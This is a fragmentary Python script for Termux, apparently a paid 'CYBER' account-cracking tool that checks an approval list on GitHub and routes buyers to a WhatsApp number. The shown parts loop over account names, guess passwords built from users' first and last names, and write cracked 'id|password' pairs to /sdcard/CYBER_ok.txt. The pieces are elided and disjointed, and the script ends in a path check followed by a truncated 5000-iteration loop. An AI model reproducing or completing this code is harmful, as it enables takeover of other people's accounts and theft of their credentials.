...
  
 ...
                 os.system('clear') 
                 print(logo) 
                 x = requests.get('https://github.com/Cyber-31/cyber-2023/blob/main/approval.txt').text 
 ...
                         os.system(f"termux-open-url https://wa.me/+8801875525411?text={bumper}") 
                         qsbuy() 
 ...
         elif menu_opt =='3': 
                 xchker() 
                 os.system('xdg-open https://github.com/Cyber-31') 
                 main() 
         elif menu_opt =='4': 
 ...
                         sys.stdout.write('\r[CYBER] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush() 
                         fn = name.split(' ')[0] 
                         try: 
                                 ln = name.split(' ')[1] 
                         except: 
 ...
                                         print(' \033[1;32m[CYBER-OK] '+roid+' | '+pas+'\033[0;97m') 
                                         open('/sdcard/CYBER_ok.txt','a').write(roid+'|'+pas+'\n') 
                                         ok.append(iid) 
                                         break 
 ...
                 print(' Ok Ids Save In : /sdcard/CYBER_ok.txt') 
                 print(50*'-') 
                 input('\n Press enter to back ') 
                 main() 
 ...
 datar = [] 
 datar.append(pat) 
 if '/data/data/com.termux/files/home/CYBER' in datar: 
         pass 
 else: 
         for i in range(5000): 
